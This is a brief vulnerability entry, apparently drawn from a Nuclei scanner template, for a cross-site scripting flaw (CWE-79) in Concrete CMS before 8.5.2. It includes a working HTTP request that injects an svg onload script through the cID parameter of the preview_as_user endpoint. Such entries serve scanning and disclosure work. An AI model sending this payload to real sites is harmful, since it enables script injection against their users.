# Vulnerability: Concrete CMS <8.5.2 - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`concrete-xss.yaml`)

## Description
Concrete CMS before 8.5.2 contains a cross-site scripting vulnerability in preview_as_user function using cID parameter.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/ccm/system/panels/page/preview_as_user/preview?cID="></iframe><svg/onload=alert("{{randstr}}")>
```

